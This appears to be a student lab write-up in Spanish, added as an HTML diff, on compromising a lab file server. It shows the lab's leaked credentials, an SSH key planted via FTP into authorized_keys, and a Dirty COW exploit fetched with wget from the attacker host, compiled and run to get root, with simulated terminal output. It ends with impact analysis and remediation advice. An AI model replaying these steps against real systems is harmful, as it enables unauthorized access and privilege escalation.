+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-amber-500 rounded-full flex items-center justify-center font-bold text-amber-500 text-[10px] shadow-[0_0_10px_rgba(245,158,11,0.8)]">14</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Conexión FTP Exitosa</h4>
+                        <p class="mb-3">Con el par de credenciales <code class="font-bold">smbuser:rootroot1</code>, se realizó un login manual al servicio FTP del servidor (puerto 21). El código <code class="text-amber-400">230 Login successful</code> confirmó que las credenciales eran legítimas en el sistema.</p>
+                        <div class="bg-black/80 border border-amber-500/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/14.png" alt="Paso 14" class="w-full h-auto border border-amber-500/30 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-amber-500 rounded-full flex items-center justify-center font-bold text-amber-500 text-[10px] shadow-[0_0_10px_rgba(245,158,11,0.8)]">15</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Exploración de Permisos FTP</h4>
+                        <p class="mb-3">Mediante el comando <code class="text-amber-400">pwd</code> se validó que la sesión FTP estaba posicionada en <code class="text-amber-400">/home/smbuser</code>. Se ejecutó un <code class="text-amber-400">cd .ssh</code> que resultó exitoso, comprobando la existencia de la carpeta y los permisos de acceso sobre la misma.</p>
+                        <div class="bg-black/80 border border-amber-500/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/15.png" alt="Paso 15" class="w-full h-auto border border-amber-500/30 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-amber-500 rounded-full flex items-center justify-center font-bold text-amber-500 text-[10px] shadow-[0_0_10px_rgba(245,158,11,0.8)]">16</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Inyección de Authorized_Keys</h4>
+                        <p class="mb-3">Estando dentro de la carpeta <code class="font-bold">.ssh</code>, se utilizó el comando <code class="text-amber-400">put</code> para transferir la llave pública creada previamente, renombrándola al vuelo como <code class="text-amber-400 font-bold">authorized_keys</code>, lo que autoriza al atacante a iniciar sesión sin clave.</p>
+                        <div class="bg-black/80 border border-amber-500/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/16.png" alt="Paso 16" class="w-full h-auto border border-amber-500/30 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-amber-500 rounded-full flex items-center justify-center font-bold text-amber-500 text-[10px] shadow-[0_0_10px_rgba(245,158,11,0.8)]">17</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Verificación de Carga y Acceso Inicial (SSH)</h4>
+                        <p class="mb-3">Tras verificar la carga con un <code class="text-amber-400">ls</code> en el FTP y salir, se procedió a iniciar conexión SSH (<code class="text-amber-400">ssh smbuser@192.168.56.103</code>). La autenticación por llave pública funcionó, otorgando una terminal interactiva (Initial Access) sin introducir contraseña alguna.</p>
+                        <div class="bg-black/80 border border-amber-500/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/17.png" alt="Paso 17" class="w-full h-auto border border-amber-500/30 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+<!-- FASE 4: Acceso Inicial y Persistencia (Continuación) -->
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-amber-500 rounded-full flex items-center justify-center font-bold text-amber-500 text-[10px] shadow-[0_0_10px_rgba(245,158,11,0.8)]">18</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Acceso Inicial Interactivo (SSH)</h4>
+                        <p class="mb-3">Con la llave pública del atacante ya autorizada en el servidor, se estableció una conexión SSH hacia el usuario <code class="text-amber-400">smbuser</code> (<code class="text-amber-400">ssh smbuser@192.168.56.103</code>). Dado que el par de llaves coincide con la configuración recién depositada, el servidor autentica al cliente sin solicitar contraseña, otorgando acceso a una shell interactiva completa. Este resultado representa el acceso inicial (initial access) exitoso al sistema objetivo.</p>
+                        <div class="bg-black/80 border border-amber-500/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/18.png" alt="Paso 18 - Acceso SSH" class="w-full h-auto border border-amber-500/30 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <!-- FASE 5: Escalada de Privilegios (Pasos 19-20) -->
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-red-500 rounded-full flex items-center justify-center font-bold text-red-500 text-[10px] shadow-[0_0_10px_rgba(239,68,68,0.8)]">19</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Identificación de Exploit y Servidor Python</h4>
+                        <p class="mb-3">La información recolectada reveló un kernel vulnerable (CentOS 7, 3.10.0-229). Desde una segunda sesión en Kali, se utilizó <code class="text-red-400">searchsploit</code> para localizar el código fuente del exploit correspondiente a Dirty COW (CVE-2016-5195). Inmediatamente después, se levantó un servidor HTTP simple con Python (<code class="text-red-400">python3 -m http.server 8000</code>) para exponer el archivo y poder descargarlo desde la víctima.</p>
+                        <div class="bg-black/80 border border-red-500/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/19.png" alt="Paso 19 - Searchsploit y Python" class="w-full h-auto border border-red-500/30 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute -left-[30px] sm:-left-[39px] top-0 w-6 h-6 bg-[#050505] border-2 border-red-500 rounded-full flex items-center justify-center font-bold text-red-500 text-[10px] shadow-[0_0_10px_rgba(239,68,68,0.8)]">20</div>
+                        <h4 class="font-bold text-white uppercase text-base mb-2">Transferencia, Compilación y Compromiso (Root)</h4>
+                        <p class="mb-3">En la sesión SSH activa, se descargó el exploit apuntando a la IP de Kali (<code class="text-red-400">wget http://192.168.56.102:8000/40616.c</code>) y se compiló utilizando <code class="text-red-400 font-bold">gcc 40616.c -o cowroot -pthread</code>. Al ejecutar el binario resultante (<code class="text-red-400">./cowroot</code>), el script sobrescribió el binario /usr/bin/passwd aprovechando la condición de carrera, y finalmente presentó una shell con privilegios de root.</p>
+                        <div class="bg-black/80 border border-red-500/20 p-2 max-w-2xl">
+                            <img src="Imagenes/Laboratorios/Act13/20.png" alt="Paso 20 - Ejecución y Root" class="w-full h-auto border border-red-500/30 zoomable-img" onclick="openImageModal(this.src)">
+                        </div>
+                    </div>
+
+                </div>
+            </section>
+
+            <!-- ANÁLISIS DE IMPACTO (CIA) -->
+            <section class="border border-red-500/30 bg-black p-6 relative shadow-inner mt-4">
+                <div class="absolute top-0 right-0 bg-red-900/40 border-l border-b border-red-500/50 px-3 py-1 font-cyber text-[10px] font-bold text-red-500 tracking-widest">
+                    CIA_IMPACT_ANALYSIS
+                </div>
+                <h3 class="text-lg font-cyber font-bold text-white uppercase tracking-widest mb-6 border-b border-white/10 pb-2">
+                    Análisis de Impacto (Modelo CIA)
+                </h3>
+                
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 font-mono text-sm text-gray-300">
+                    <!-- Confidencialidad -->
+                    <div class="bg-[#050505] border border-white/10 p-5 hover:border-red-500/50 transition-colors">
+                        <h4 class="text-red-400 font-bold mb-2 uppercase">> Confidencialidad (Crítico)</h4>
+                        <p class="leading-relaxed">El acceso root otorga capacidad de lectura sobre absolutamente cualquier archivo del sistema, incluyendo bases de datos, archivos de configuración con credenciales adicionales, claves privadas, logs y recursos compartidos. La fuga de datos expuso contraseñas previas a la escalada.</p>
+                    </div>
+                    <!-- Integridad -->
+                    <div class="bg-[#050505] border border-white/10 p-5 hover:border-red-500/50 transition-colors">
+                        <h4 class="text-red-400 font-bold mb-2 uppercase">> Integridad (Crítico)</h4>
+                        <p class="leading-relaxed">Con privilegios de root, un atacante puede modificar, corromper o eliminar cualquier binario u archivo. La explotación de Dirty COW ilustró este riesgo directamente al sobrescribir en memoria el binario <code class="text-red-400">/usr/bin/passwd</code> para obtener persistencia SUID.</p>
+                    </div>
+                    <!-- Disponibilidad -->
+                    <div class="bg-[#050505] border border-white/10 p-5 hover:border-amber-500/50 transition-colors">
+                        <h4 class="text-amber-400 font-bold mb-2 uppercase">> Disponibilidad (Alto)</h4>
+                        <p class="leading-relaxed">Aunque no se ejecutaron ataques DoS, el acceso root es suficiente para detener servicios críticos (FTP, SMB, SSH, HTTP), eliminar datos masivamente o inutilizar por completo el servidor, afectando la continuidad operativa de la organización.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- RECOMENDACIONES (MITIGACIÓN) -->
+            <section class="border border-green-500/30 bg-green-900/10 p-6 relative mt-4">
+                <div class="absolute top-0 right-0 bg-green-500/20 border-l border-b border-green-500/50 px-3 py-1 font-cyber text-[10px] font-bold text-green-400 tracking-widest">
+                    SECURITY_PATCH
+                </div>
+                <h3 class="text-lg font-cyber font-bold text-green-400 uppercase tracking-widest mb-6 border-b border-green-500/20 pb-2">
+                    Recomendaciones de Remediación
+                </h3>
+                
+                <div class="space-y-6 font-mono text-sm text-gray-300">
+                    <div>
+                        <h4 class="text-red-400 font-bold mb-2">> Prioridad Crítica</h4>
+                        <ul class="list-disc pl-5 marker:text-red-400 space-y-1">
+                            <li>Eliminar de inmediato archivos de texto plano accesibles públicamente que contengan credenciales o información sensible (<code class="text-red-400">readme.txt</code>).</li>
+                            <li>Actualizar el kernel de Linux o aplicar parche de seguridad correspondiente a CVE-2016-5195 (Dirty COW) para evitar explotación de condición de carrera.</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h4 class="text-amber-400 font-bold mb-2">> Prioridad Alta</h4>
+                        <ul class="list-disc pl-5 marker:text-amber-400 space-y-1">
+                            <li>Deshabilitar inicio de sesión anónimo en servicios FTP y restringir permisos de escritura fuera del directorio de datos designado, protegiendo carpetas como <code class="text-amber-400">.ssh</code>.</li>
+                            <li>Auditar y restringir permisos en Samba, deshabilitando explícitamente sesiones NULL.</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h4 class="text-green-400 font-bold mb-2">> Prioridad Media / General</h4>
+                        <ul class="list-disc pl-5 marker:text-green-400 space-y-1">
+                            <li>Actualizar el servicio web Apache 2.4.6 y deshabilitar métodos riesgosos (TRACE).</li>
+                            <li>Establecer políticas robustas de gestión de parches (Patch Management) y reducir la superficie de ataque cerrando puertos y servicios innecesarios.</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- TABLA DE HALLAZGOS (VULNERABILITY MATRIX) -->
+            <section class="border border-white/5 bg-black p-6 relative shadow-inner mt-4">
+                <div class="absolute top-0 right-0 bg-yellow-900/40 border-l border-b border-yellow-500/50 px-3 py-1 font-cyber text-[10px] font-bold text-yellow-500 tracking-widest">
+                    VULNERABILITY_MATRIX
+                </div>
+                <h3 class="text-lg font-cyber font-bold text-white uppercase tracking-widest mb-4 border-b border-white/10 pb-2">
+                    Tabla de Hallazgos
+                </h3>
+                
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left border-collapse text-xs md:text-sm border border-white/10">
+                        <thead>
+                            <tr class="border-b border-white/10 text-gray-400 bg-white/5 font-cyber tracking-widest uppercase">
+                                <th class="p-3">ID</th>
+                                <th class="p-3">Vulnerabilidad</th>
+                                <th class="p-3">Severidad</th>
+                                <th class="p-3">Impacto</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-white/5 font-mono text-gray-300">
+                            <!-- H-01 -->
+                            <tr class="hover:bg-white/5 transition-colors">
+                                <td class="p-3 font-bold text-red-500">H-01</td>
+                                <td class="p-3">Divulgación de información sensible (readme.txt expone credenciales)</td>
+                                <td class="p-3"><span class="px-2 py-1 bg-red-900/40 text-red-400 border border-red-500/50 text-[10px] font-bold tracking-widest">CRÍTICA</span></td>
+                                <td class="p-3 leading-relaxed">Compromiso de confidencialidad: revela credenciales válidas (<code class="text-amber-400">smbuser:rootroot1</code>) utilizadas para el acceso inicial al sistema.</td>
+                            </tr>
+                            <!-- H-02 -->
+                            <tr class="hover:bg-white/5 transition-colors">
+                                <td class="p-3 font-bold text-red-500">H-02</td>
+                                <td class="p-3">Escalada de privilegios local — Dirty COW (CVE-2016-5195)</td>
+                                <td class="p-3"><span class="px-2 py-1 bg-red-900/40 text-red-400 border border-red-500/50 text-[10px] font-bold tracking-widest">CRÍTICA</span></td>
+                                <td class="p-3 leading-relaxed">Compromiso total de confidencialidad, integridad y disponibilidad: permite obtener una shell root a partir de un usuario sin privilegios.</td>
+                            </tr>
+                            <!-- H-03 -->
+                            <tr class="hover:bg-white/5 transition-colors">
+                                <td class="p-3 font-bold text-amber-500">H-03</td>
+                                <td class="p-3">Recurso SMB "smbdata" con lectura/escritura vía sesión NULL</td>
+                                <td class="p-3"><span class="px-2 py-1 bg-amber-900/40 text-amber-400 border border-amber-500/50 text-[10px] font-bold tracking-widest">ALTA</span></td>
+                                <td class="p-3 leading-relaxed">Cualquier usuario no autenticado puede leer y escribir archivos en el recurso compartido, incluyendo la carga de contenido malicioso.</td>
+                            </tr>
+                            <!-- H-04 -->
+                            <tr class="hover:bg-white/5 transition-colors">
+                                <td class="p-3 font-bold text-amber-500">H-04</td>
+                                <td class="p-3">Login FTP anónimo/autenticado con escritura sobre directorio .ssh</td>
+                                <td class="p-3"><span class="px-2 py-1 bg-amber-900/40 text-amber-400 border border-amber-500/50 text-[10px] font-bold tracking-widest">ALTA</span></td>
+                                <td class="p-3 leading-relaxed">Permitió depositar una llave SSH no autorizada en <code class="text-amber-400">authorized_keys</code>, otorgando acceso persistente sin contraseña.</td>
+                            </tr>
+                            <!-- H-05 -->
+                            <tr class="hover:bg-white/5 transition-colors">
+                                <td class="p-3 font-bold text-ctosBlue">H-05</td>
+                                <td class="p-3">Servicio Apache 2.4.6 desactualizado con método HTTP TRACE habilitado</td>
+                                <td class="p-3"><span class="px-2 py-1 bg-ctosBlue/20 text-ctosBlue border border-ctosBlue/50 text-[10px] font-bold tracking-widest">MEDIA</span></td>
+                                <td class="p-3 leading-relaxed">Expone al servidor a ataques de Cross-Site Tracing (XST) y vulnerabilidades conocidas de versiones antiguas.</td>
+                            </tr>
+                            <!-- H-06 -->
+                            <tr class="hover:bg-white/5 transition-colors">
+                                <td class="p-3 font-bold text-ctosBlue">H-06</td>
+                                <td class="p-3">Segundo servicio FTP anónimo (ProFTPD 1.3.5, puerto 2121)</td>
+                                <td class="p-3"><span class="px-2 py-1 bg-ctosBlue/20 text-ctosBlue border border-ctosBlue/50 text-[10px] font-bold tracking-widest">MEDIA</span></td>
+                                <td class="p-3 leading-relaxed">Superficie de ataque adicional innecesaria; aumenta el riesgo de explotación de vulnerabilidades específicas.</td>
+                            </tr>
+                            <!-- H-07 -->
+                            <tr class="hover:bg-white/5 transition-colors">
+                                <td class="p-3 font-bold text-gray-400">H-07</td>
+                                <td class="p-3">Cabeceras de seguridad HTTP ausentes y directory indexing en /icons/</td>
+                                <td class="p-3"><span class="px-2 py-1 bg-gray-800 text-gray-400 border border-gray-600 text-[10px] font-bold tracking-widest">BAJA</span></td>
+                                <td class="p-3 leading-relaxed">Facilita el reconocimiento y expone al servidor a ataques del lado del cliente (clickjacking, MIME sniffing).</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+        </div>
+    </main>
+
+    <footer class="mt-auto py-8 text-center text-xs text-gray-500 font-cyber tracking-widest uppercase relative z-10 bg-black/90 border-t border-ctosBlue/30 w-full">
+        <p>ctOS v2.0 // &copy; 2026 Samuel López Gómez/All rights reserved.</p>
+        <p class="mt-2 text-white">RED DE VIGILANCIA COMPROMETIDA // CNO IV – Seguridad Informática</p>
+    </footer>
+
+    <!-- MODAL PARA AMPLIAR IMÁGENES -->
+    <div id="image-modal" class="fixed inset-0 z-[40000] bg-black/95 backdrop-blur-md hidden flex-col justify-center items-center p-4 transition-opacity duration-300 opacity-0" onclick="closeImageModal()">
+        <button onclick="closeImageModal()" class="absolute top-6 right-6 text-gray-500 hover:text-white transition-colors outline-none font-cyber font-bold text-2xl hover:scale-110">
+            [X]
+        </button>
+        <img id="modal-img-src" src="" alt="Captura Ampliada" class="max-w-full max-h-full border-2 border-ctosBlue shadow-[0_0_30px_rgba(0,168,255,0.4)]" onclick="event.stopPropagation()">
+        <p class="text-ctosBlue font-mono text-xs mt-4 tracking-widest">> Clickea en cualquier parte para cerrar <</p>
+    </div>
+
+    <script>
+        // Simulador de Terminal Interactiva
+        function setSimPhase(phase) {
+            const outBox = document.getElementById('simOutputBox');
+            const indicator = document.getElementById('simPhaseIndicator');
+            
+            let output = "";
+
+            if (phase === 1) {
+                indicator.innerText = "FASE 1: RECONOCIMIENTO Y ENUMERACIÓN";
+                indicator.className = "text-ctosBlue font-bold";
+                output = `kali@kali:~$ nmap -p- -A 192.168.56.103
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-30 03:21 -0400
+Nmap scan report for 192.168.56.103
+Host is up (0.00032s latency).
+Not shown: 64433 filtered tcp ports (no-response), 1004 closed tcp ports
+
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed
+|_drwxrwxrwx    3 0        0            16 Feb 19  2020 pub [NSE: writeable]
+22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
+80/tcp   open  http     Apache httpd 2.4.6 ((CentOS))
+|_http-title: My File Server
+445/tcp  open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)
+
+kali@kali:~$ curl http://192.168.56.103/readme.txt
+My Password is
+rootroot1
+`;
+            } else if (phase === 2) {
+                indicator.innerText = "FASE 2: ACCESO INICIAL (SSH INJECTION)";
+                indicator.className = "text-amber-400 font-bold";
+                output = `kali@kali:~$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Your public key has been saved in /root/.ssh/id_rsa.pub.
+
+kali@kali:~$ ftp 192.168.56.103
+Connected to 192.168.56.103.
+220 (vsFTPd 3.0.2)
+Name (192.168.56.103:kali): smbuser
+331 Please specify the password.
+Password: 
+230 Login successful.
+ftp> cd .ssh
+250 Directory successfully changed.
+ftp> put /root/.ssh/id_rsa.pub authorized_keys
+226 Transfer complete.
+563 bytes sent in 00:00 (39.17 KiB/s)
+ftp> exit
+
+kali@kali:~$ ssh smbuser@192.168.56.103
+Last login: Thu Feb 20 16:42:21 2020
+[smbuser@fileserver ~]$ id
+uid=1000(smbuser) gid=1000(smbuser) groups=1000(smbuser)
+`;
+            } else if (phase === 3) {
+                indicator.innerText = "FASE 3: ESCALADA DE PRIVILEGIOS (DIRTY COW)";
+                indicator.className = "text-red-500 font-bold animate-pulse";
+                output = `[smbuser@fileserver ~]$ uname -a
+Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 11:36:42 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+
+[smbuser@fileserver ~]$ wget http://192.168.56.102:8000/40616.c
+2026-09-30 13:32:32 (719 MB/s) - '40616.c' saved [4803/4803]
+
+[smbuser@fileserver ~]$ gcc 40616.c -o cowroot -pthread
+[smbuser@fileserver ~]$ ./cowroot
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 27832
+Racing, this may take a while..
+thread stopped
+/usr/bin/passwd is overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+
+[root@fileserver smbuser]# cat /root/proof.txt
+Best of Luck
+af52e0163b03cbf7c6dd146351594a43
+[root@fileserver root]# 
+`;
+            }
+            
+            // Simular escritura en terminal
+            outBox.innerHTML = "";
+            let i = 0;
+            const typeWriter = setInterval(() => {
+                outBox.innerHTML += output.charAt(i);
+                outBox.scrollTop = outBox.scrollHeight; // Auto-scroll
+                i++;
+                if (i >= output.length) {
+                    clearInterval(typeWriter);
+                }
+            }, 5);
+        }
+
+        window.onload = function() {
+            setSimPhase(1);
+        };
+
+        // Modal de Imágenes
+        const imageModal = document.getElementById('image-modal');
+        const modalImgSrc = document.getElementById('modal-img-src');
+
+        function openImageModal(src) {
+            modalImgSrc.src = src;
+            imageModal.classList.remove('hidden');
+            imageModal.classList.add('flex');
+            setTimeout(() => { imageModal.classList.remove('opacity-0'); }, 10);
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeImageModal() {
+            imageModal.classList.add('opacity-0');
+            setTimeout(() => {
+                imageModal.classList.add('hidden');
+                imageModal.classList.remove('flex');
+                modalImgSrc.src = "";
+                document.body.style.overflow = 'auto';
+            }, 300);
+        }
+
+        // Telemetría Header
+        const nameElement = document.getElementById('telemetry-name');
+        if (nameElement) {
+            const originalText = nameElement.getAttribute('data-value');
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*<>";
+            function runTelemetryEffect() {
+                let iteration = 0;
+                clearInterval(nameElement.interval);
+                nameElement.interval = setInterval(() => {
+                    nameElement.innerText = originalText.split("").map((letter, index) => {
+                        if (letter === " ") return " ";
+                        if (index < iteration) return originalText[index];
+                        return chars[Math.floor(Math.random() * chars.length)];
+                    }).join("");
+                    if (iteration >= originalText.length) {
+                        clearInterval(nameElement.interval);
+                        setTimeout(runTelemetryEffect, 4000);
+                    }
+                    iteration += 1 / 3;
+                }, 30);
+            }
+            runTelemetryEffect();
+        }
+
+        // Matrix Background
+        const canvas = document.getElementById('matrix-bg');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const charArray = "010101100100101ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".split('');
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+
+        for (let x = 0; x < columns; x++) { drops[x] = Math.random() * -100; }
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(5, 5, 7, 0.1)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00a8ff';
+            ctx.font = fontSize + 'px "Fira Code", monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                ctx.fillText(charArray[Math.floor(Math.random() * charArray.length)], i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 33);
+        window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
+    </script>
+</body>
+</html>
